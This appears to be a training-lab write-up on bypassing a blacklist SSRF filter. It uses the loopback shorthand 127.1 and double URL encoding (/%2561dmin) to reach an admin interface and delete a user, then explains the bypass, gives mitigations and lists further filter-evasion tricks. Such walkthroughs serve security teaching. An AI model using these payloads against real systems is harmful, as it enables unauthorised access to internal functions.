# Lab 03: SSRF with Blacklist-Based Input Filter

## Lab Description

The application attempts to prevent SSRF by blocking requests to localhost and the `/admin` path using blacklist-based filtering.

Your objective is to bypass these weak protections, access the administrator interface, and delete the user **carlos**.

---

# Objective

- Bypass the blacklist filter.
- Reach the administrator interface.
- Delete `carlos`.

---

# Initial Testing

Test:

```text
http://127.0.0.1/
```

Response:

```
External stock check blocked for security reasons
```

---

Test:

```text
http://127.0.0.1/admin
```

Blocked.

---

## Alternative Loopback Address

Try:

```text
http://127.1/
```

The filter still blocks access.

---

## Bypass Technique

The blacklist also blocks the literal string:

```text
/admin
```

Use **double URL encoding** to obfuscate the character **a**.

Replace:

```text
/admin
```

with:

```text
/%2561dmin
```

Resulting payload:

```text
http://127.1/%2561dmin
```

---

## Final Payload

```text
http://127.1/%2561dmin/delete?username=carlos
```

---

# Why This Works

The application checks the raw input before processing it.

The backend later performs URL decoding.

After decoding:

```text
%2561

↓

%61

↓

a
```

The backend ultimately requests:

```text
/admin
```

while the filter never detects the forbidden string.

---

# Burp Workflow

```
Intercept

↓

Repeater

↓

127.0.0.1

↓

Blocked

↓

127.1

↓

Blocked

↓

Double URL Encoding

↓

Admin Access
```

---

# Impact

Weak blacklist filtering can be bypassed, allowing attackers to access sensitive internal functionality.

---

# Mitigation

- Avoid blacklist-based validation.
- Use strict allowlists.
- Normalize and decode input before validation.
- Restrict outbound requests.

---

# Bug Bounty Methodology

When a request is blocked:

Try:

- Alternative IP formats
- URL encoding
- Double URL encoding
- Redirect chains
- DNS tricks

---

# Key Learnings

- Blacklists are rarely sufficient against SSRF.
- Multiple representations of the same destination can bypass simple filters.
- Double URL encoding is a common bypass technique.